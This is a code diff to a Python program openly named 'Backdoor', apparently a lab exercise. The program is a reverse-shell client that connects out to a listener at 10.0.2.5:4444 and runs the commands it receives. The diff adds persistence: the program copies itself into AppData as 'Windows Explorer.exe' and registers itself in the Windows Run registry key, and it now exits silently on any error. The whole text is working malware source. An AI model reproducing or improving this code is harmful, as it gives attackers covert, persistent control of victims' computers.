@@ -1,12 +1,20 @@
 import socket
 import subprocess, json, os, base64
+import sys, shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM means we want to create
         # a TCP connection and TCP is a stream based protocol
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -60,6 +68,8 @@ class Backdoor:
                 command_result = "[-] Error during command execution."
             self.reliable_send(command_result)
 
-
-myBackdoor = Backdoor("10.0.2.15", 4444)
-myBackdoor.run()
+try:
+    myBackdoor = Backdoor("10.0.2.5", 4444)
+    myBackdoor.run()
+except Exception:
+    sys.exit()
